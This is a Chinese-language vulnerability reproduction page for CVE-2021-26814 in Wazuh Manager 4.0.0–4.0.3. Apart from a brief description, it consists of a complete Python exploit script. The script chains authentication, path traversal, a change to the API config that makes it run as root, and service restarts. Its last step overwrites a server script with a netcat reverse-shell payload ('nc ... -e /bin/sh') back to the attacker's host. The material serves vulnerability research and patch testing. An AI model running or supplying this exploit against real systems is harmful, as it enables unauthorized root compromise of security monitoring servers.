# Wazuh Manager 代码执行漏洞CVE-2021-26814

## 漏洞描述

Wazuh 从4.0.0到4.0.3的 Wazuh API允许经过身份验证的用户通过/manager/files URI以管理权限执行任意代码。

## 漏洞影响

```
Wazuh Manager  v.4.0.0-4.0.3
```

## 漏洞复现

poc：

```
PoC.py [-h] -user USERNAME -pwd PASSWORD -lip SRCIP -lport SRCPORT -tip
              DESTIP -tport DESTPORT
```

```python
# Exploit Title: Wazuh 4.0.3 API RCE
# Author: WickdDavid (Davide Meacci)
# Date: 2021-01-01
# Vendor Homepage: https://github.com/wazuh/wazuh
# Version : 4.0.3


import requests
import sys
import argparse
import time
import json
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


parser = argparse.ArgumentParser(description='Wazuh-manager authenticated RCE by WickdDavid')
parser.add_argument('-user', dest='username',required=True,
                    help='wazuh API username')
parser.add_argument('-pwd', dest='password',required=True,
                    help='wazuh API password')
parser.add_argument('-lip', dest='srcip',required=True,
                    help='listening server')
parser.add_argument('-lport', dest='srcport',required=True,
                    help='listening port')
parser.add_argument('-tip', dest='destip',required=True,
                    help='target server ip (wazuh API)')
parser.add_argument('-tport', dest='destport',required=True,
                    help='target server port (wazuh API)')


args = parser.parse_args()

# executed payload may be changed here

exec_payload = """
import os #:l
os.system("nc %s %s -e /bin/sh") #:l
""" % (args.srcip, args.srcport)


config_payload = { "drop_privileges": False }


proxies = {
	"http":"http://127.0.0.1:8080",
	"https":"https://127.0.0.1:8080"
}

target = "https://%s:%s" % (args.destip,args.destport)
auth_token = ""
path_traversal = "etc/lists/../../../../.."
headers = {}

# step 1 - obtaining auth token

r = requests.get("%s/security/user/authenticate?raw=true" % target, auth=(args.username, args.password),verify=False)

if(r.status_code == 200):
    auth_token = r.text
    headers["Authorization"] = "Bearer %s" % auth_token
else:
    print("[!] No auth code recovered. Check username and password")
    exit(1)

# step 2 - Privilege Escalation on API (not implemented)


# step 3 - Save files to be restored later

file_to_overwrite = "/var/ossec/api/scripts/wazuh-apid.py"
print("[+] Saving files to restore later...")
r = requests.get("%s/manager/files?path=%s%s" % (target,path_traversal,file_to_overwrite), headers = headers, verify=False)
f = open("backup.py","w")
f.write(json.loads(r.text)["contents"])
f.close()
time.sleep(1)

# step 4 - Local Privilege Escalation 

print("[+] Changing API config to run as root...")
r = requests.put("%s/manager/api/config" % target, headers = headers, json = config_payload, verify=False)
time.sleep(1)

# step 5 - Restart server (now api service runs as root) 

print("[+] Restarting server...")
r = requests.put("%s/manager/restart?wait_for_complete=true" % target, headers = headers,verify=False)
#print(r.text)

data = {"title":"Bad Request"}
while "title" in data and "Bad request" in data["title"]:
    time.sleep(5)
    try:
        r = requests.get("%s/manager/status" % target, headers = headers, verify=False)
        #print(r.text)
        data = json.loads(r.text)
    except:
        continue

# step 6 - Overwrite /var/ossec/api/scripts/wazuh-apid.py with malicious python payload

print("[+] Uploading payload...")
r = requests.put("%s/manager/files?path=%s%s&overwrite=true" % (target,path_traversal,file_to_overwrite), headers = headers, data = exec_payload, verify=False)
#print(r.text)
time.sleep(1)

# step 7 - Restart server (now malicious payload will be run by the server)


print("[+] Restarting API service for the last time...")
r = requests.put("%s/manager/restart?wait_for_complete=true" % target, headers = headers,verify=False)
#print(r.text)

data = {"title":"Bad Request"}
while "title" in data and "Bad request" in data["title"]:
    time.sleep(5)
    try:
        r = requests.get("%s/manager/status" % target, headers = headers, verify=False)
        #print(r.text)
        data = json.loads(r.text)
    except:
        continue


print("[+] Payload executed, check your shell now.")
print("[+] Remember to restore changed file (check local backup file)")
```

